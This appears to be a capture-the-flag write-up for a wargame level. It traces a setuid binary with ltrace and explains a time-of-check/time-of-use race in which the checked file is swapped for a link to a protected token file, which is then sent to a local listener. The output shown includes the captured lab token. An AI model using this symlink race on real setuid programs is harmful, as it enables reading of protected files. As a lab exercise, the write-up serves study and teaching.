# level10 solution
Given setuid binary and token file with no read permissions for our user. We can run this binary with ltrace to get the idea of wht it's doing:

    ltrace ./level10 /tmp/some_file 127.0.0.1
    __libc_start_main(0x80486d4, 3, 0xbffff7b4, 0x8048970, 0x80489e0 <unfinished ...>
    access("/tmp/some_file", 4)                      = 0
    printf("Connecting to %s:6969 .. ", "127.0.0.1") = 32
    fflush(0xb7fd1a20Connecting to 127.0.0.1:6969 .. )                               = 0
    socket(2, 1, 0)                                  = 3
    inet_addr("127.0.0.1")                           = 0x0100007f
    htons(6969, 1, 0, 0, 0)                          = 14619
    connect(3, 0xbffff6fc, 16, 0, 0)                 = 0
    write(3, ".*( )*.\n", 8.*( )*.
    )                         = 8
    printf("Connected!\nSending file .. "Connected!
    )           = 27
    fflush(0xb7fd1a20Sending file .. )                               = 0
    open("/tmp/some_file", 0, 010)                   = 4
    read(4, "", 4096)                                = 0
    write(3, "", 0)                                  = 0
    puts("wrote file!"wrote file!
    )                              = 12
    +++ exited (status 12) +++
    [1]+  Done                    nc -l 127.0.0.1 6969

To run this program we need to start a new server with netcat and create some file which we have access to. Setuid binary accepts file and ip address as arguments, connects to the provided address and sends provided file via tcp stream. This program first checks if we have access to the provided file, then it connects to the server and sends initial message, and only after that it will open provided file and send file content to the server. In this gap between access check and file open we can replace original file with link to the token file. So we have to code server application which accepts one client and immediately removes provided to the setuid binary file with link to the roken file, then it should read 2 messages and display second one.

    ./level10 /tmp/level10/token 127.0.0.1
    Connecting to 127.0.0.1:6969 .. Initial message recieved: .*( )*.
    Connected!
    Sending file .. Token recieved: woupa2yuojeeaaed06riuj63c
    wrote file!
    [1]+  Done                    ./server  (wd: /tmp/level10)
    (wd now: ~)
